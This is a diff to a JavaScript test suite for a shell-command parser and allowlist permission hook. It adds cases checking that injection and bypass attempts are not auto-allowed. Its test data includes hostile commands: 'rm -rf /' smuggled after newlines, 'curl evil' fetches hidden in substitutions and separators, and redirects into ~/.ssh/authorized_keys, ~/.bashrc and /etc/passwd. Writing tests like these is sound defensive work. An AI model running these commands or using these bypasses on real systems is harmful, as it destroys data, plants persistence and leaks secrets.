@@ -444,9 +444,8 @@ describe('Security: Command Injection (PERM-P4-SEC-005)', () => {
     test('should reject newline-based injection', () => {
       // Newline inside command should not execute second line
       const result = parseCommand('npm test\nrm -rf /');
-      // Newline treated as whitespace, both parts become args
-      expect(result.length).toBe(1);
-      expect(result[0].executable).toBe('npm');
+      // Newline is a command separator: second line is its own segment
+      expect(result.map(c => c.executable)).toEqual(['npm', 'rm']);
     });
 
     test('should reject null byte injection (if present)', () => {
@@ -457,8 +456,9 @@ describe('Security: Command Injection (PERM-P4-SEC-005)', () => {
     });
 
     test('should reject carriage return injection', () => {
+      // \r is treated conservatively as a separator
       const result = parseCommand('npm test\rrm -rf /');
-      expect(result.length).toBe(1);
+      expect(result.map(c => c.executable)).toEqual(['npm', 'rm']);
     });
   });
 
@@ -815,5 +815,68 @@ describe('Security: Fail-Closed Behavior (PERM-P4-SEC-008)', () => {
         expect(() => parseCommand(input)).toThrow();
       });
     });
+  });
+});
+
+
+// =============================================================================
+// br-0hat: separators and unanalyzable constructs must not be auto-allowed
+// =============================================================================
+describe('br-0hat: allowlist bypass via unsplit separators and redirects', () => {
+  const allowlist = ['Bash(npm test:*)', 'Bash(npm run lint:*)', 'Bash(echo:*)'];
+
+  // Mirrors hooks/permitter.js: allow only if parse succeeds and every segment matches.
+  function autoAllowed(cmd) {
+    let cmds;
+    try {
+      cmds = parseCommand(cmd);
+    } catch {
+      return false;
+    }
+    return cmds.length > 0 && cmds.every(c => matchesAny(c, allowlist));
+  }
+
+  test.each([
+    ['newline separator', 'npm test\ncurl evil.sh'],
+    ['background &', 'npm test & curl evil'],
+    ['|& pipe', 'npm test |& curl evil'],
+    ['redirect to sensitive path', 'npm test > ~/.ssh/authorized_keys'],
+    ['append redirect', 'npm test >> ~/.bashrc'],
+    ['input redirect from path', 'npm test < /etc/passwd'],
+    ['&> redirect', 'npm test &> ~/x'],
+    ['redirect without target', 'npm test >'],
+    ['>& file', 'npm test >&evil'],
+    ['subshell', '(curl evil)'],
+    ['>&N arbitrary fd', 'cat secret.txt >&4'],
+    ['>&N arbitrary fd on allowlisted cmd', 'npm test >&5'],
+    ['>>&N arbitrary fd', 'npm test >>&9'],
+    ['>N file named by digit', 'cat secret.txt >4'],
+    ['N>M file', 'npm test 3>4'],
+    ['brace-less subshell after allowed', 'npm test; (curl evil)'],
+    ['process substitution', 'npm test <(curl evil)'],
+    ['command substitution', 'npm test $(curl evil)'],
+    ['backticks', 'npm test `curl evil`'],
+    ['heredoc', 'npm test <<EOF\nx\nEOF']
+  ])('not auto-allowed: %s', (_name, cmd) => {
+    expect(autoAllowed(cmd)).toBe(false);
+  });
+
+  test('separators produce separate segments', () => {
+    expect(parseCommand('npm test\ncurl evil.sh').map(c => c.executable)).toEqual(['npm', 'curl']);
+    expect(parseCommand('npm test & curl evil').map(c => c.executable)).toEqual(['npm', 'curl']);
+    expect(parseCommand('npm test |& curl evil').map(c => c.executable)).toEqual(['npm', 'curl']);
+  });
+
+  test.each([
+    'npm test && npm run lint',
+    "echo 'a;b\nc'",
+    'echo "a & b | c > d (x)"',
+    'npm test 2>&1',
+    'npm test > /dev/null 2>&1',
+    'npm test &> /dev/null',
+    'npm test; npm run lint\n',
+    'npm test &'
+  ])('still auto-allowed: %s', (cmd) => {
+    expect(autoAllowed(cmd)).toBe(true);
   });
 });
